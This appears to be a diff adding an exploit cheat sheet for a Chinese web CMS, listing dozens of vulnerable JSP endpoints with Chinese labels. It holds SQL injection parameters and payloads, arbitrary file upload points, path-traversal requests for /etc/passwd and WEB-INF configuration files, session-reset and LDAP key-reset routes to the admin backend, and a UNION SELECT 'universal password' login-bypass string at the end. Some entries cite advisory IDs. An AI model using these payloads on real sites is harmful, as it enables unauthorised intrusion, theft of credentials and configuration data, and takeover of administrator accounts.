@@ -1,0 +1,119 @@
+/jcms/workflow/objectbox/selectx_list.jsp?id=1 SQLI id
+
+/jcms/workflow/sys/que_dictionary.jsp?que_keywords1=aaa  SQLI  que_keywords1
+
+//jcms/m_5_e/init/sitesearch/opr_classajax.jsp?classid=1 SQLI  classid 
+
+/jcms/m_5_5/m_5_5_1/que_flow.jsp?que_keywords1=aaa   SQLI  que_keywords1
+
+/jcms/m_5_e/module/messagebook/opr_messagebook_column.jsp?fn_billstatus=D&i_ID=1  SQLI i_ID
+
+/jcms/m_5_e/init/download/downfile.jsp?filename=1   SQLI filename
+
+/jcms/jcms_files/jcms1/web1/site/module/comment/opr_ballot.jsp  SQLI
+
+/vipchat/home/front/search/opr_chatsearch.jsp?action=simplesearch&keywords=%' AND 5=5 AND '%'='  SQLI
+
+/xxgk/services/WSSync_searchinfo?wsdl  SQLI
+
+/xxgk/services/WSYsqgk?wsdl  SQLI
+
+/xxgk/jcms_files/jcms1/web1/site/zfxxgk/letterbox/que_letterbox.jsp?targetid=1  SQLIiI targetid
+
+/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1 SQLI  tagid
+
+/pertool_subsite/read/favo_ajax_for_gen.jsp?opr=DO&uid=1&type=1&url=1&title=1  SQLI  uid
+
+/vc/vc/interface/index/que_style_coltop.jsp?webid=1+and+1=1  SQLI  webid
+
+/vc/vc/para/opr_initvc.jsp?webid=1  SQLI  webid
+
+/jcms/m_5_e/module/voting/opr_voting_modal.jsp?i_ID=11&fn_billstatus=B  SQLI  i_ID
+
+/module/sitesearch/index.jsp?columnid=1  SQLI
+
+/jcms/jcms_files/jcms1/web2/site/module/comment/opr_getcount.jsp?fn_Keywords=q&starttime=&endtime=&pltype=Y&fn_Scope=vc_infoTitle  SQLI fn_Keywords
+ 
+/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/ysqgksearch.jsp  SQLI post(currpage=&stateid=1&applystarttime=&applyendtime=&webid=1) applystarttime webid
+
+/jcms/workflow/objectbox/selectx_groupuserlist.jsp?groupid=1&changetype=1  SQLI groupid
+
+/vc/vc/interface/index/que_scount.jsp?webid=1  SQLI webid
+
+/module/rss/rssfeed.jsp?colid=  SQLI  colid
+
+/jcms/m_5_d/opr_wap_col.jsp?strid=122222222&fn_billstatus=D   SQLI  strid
+
+/zfxxgk/subjectinfo.jsp?subjectbm=  SQLI  subjectbm
+
+/jcms/short_message/que_sendmsg.jsp?loginid=  SQLI  loginid
+
+/module/sitesearch/index.jsp  SQLI  columnid
+
+/zfxxgk/serviceobjectinfo.jsp?servicebm=   SQLI   servicebm
+
+/jcms/workflow/design/que_model.jsp?userid=&que_keywords=一&que_keywords1=一&que_classid=&que_classname=&b_valid=&starttime=&endtime=&sortorder=&sortnum=-1 SQLI que_keywords1
+
+/jcms/short_message/que_recemsg.jsp?que_keywords=1&loginid=a*&que_startdate=&que_enddate=   SQLI  loginid
+
+/jcms/m_5_5/m_5_5_3/import_style.jsp  任意文件上传 
+
+/vc/vc/index/que_index.jsp  任意文件上传
+
+/lm/sys/opr_uploadimg.jsp  任意文件上传
+
+/vc/vc/index/opr_upload.jsp  任意文件上传
+
+/jcms/setup/opr_upload.jsp  任意文件上传
+
+/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1  任意文件上传
+
+/jcms/jcms_files/jcms1/web1/site/module/oss/downfile.jsp  任意文件上传（二次上传）  https://www.seebug.org/vuldb/ssvid-93905
+
+/jcms/workflow/design/readxml.jsp?flowcode=../../WEB-INF/config/dbconfig 文件读取
+
+/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl   文件读取
+
+/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/ini/merpserver.ini  文件读取
+
+/jcms/m_5_e/module/voting/down.jsp?filename=username&pathfile=/etc/passwd  任意任意文件下载
+
+ /jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd  任意文件下载
+ 
+ /vc/vc/columncount/tem/downfile.jsp 任意文件下载
+
+/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd  任意文件下载
+
+/jcms/m_1_9/user/down.jsp?abspathfile=/etc/passwd  任意文件下载
+
+/jcms/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1  任意文件下载
+
+/jcms/m_5_9/sendreport/downfile.jsp?filename=/etc/passwd&savename=passwd.txt  任意文件下载
+
+/jcms/m_5_e/init/guestbook/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/passwd   任意文件下载
+
+/jcms/m_5_e/init/comment/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/passwd  任意文件下载
+ 
+/jcms/setup/opr_licenceinfo.jsp  session重置绕过登陆验证进入后台  https://www.seebug.org/vuldb/ssvid-93918
+
+/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/que_code.jsp     session重置绕过登陆验证进入后台  https://www.seebug.org/vuldb/ssvid-93915
+
+/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/sendcode.jsp     session重置绕过登陆验证进入后台   https://www.seebug.org/vuldb/ssvid-93915
+
+/vc/setup/opr_setting.jsp  管理员密码清空进入后台
+
+/jcms/interface/ldap/receive.jsp  修改密钥重置管理员账号进入后台   https://www.seebug.org/vuldb/ssvid-90248
+
+/jcms/interface/ldap/ldapconf.xml  密钥泄漏重置管理员账号进入后台   https://www.seebug.org/vuldb/ssvid-90213
+
+/setup/index.html  后台弱口令爆破
+
+/jcms/interface/web.jsp  后台弱口令爆破
+
+/jcms/setup/publishadmin.jsp  配置文件信息未授权访问漏洞
+
+登陆场万能密码
+x' union select '00000','admin','AEY=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'1',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from dual-- 密码:1 
+
+
+
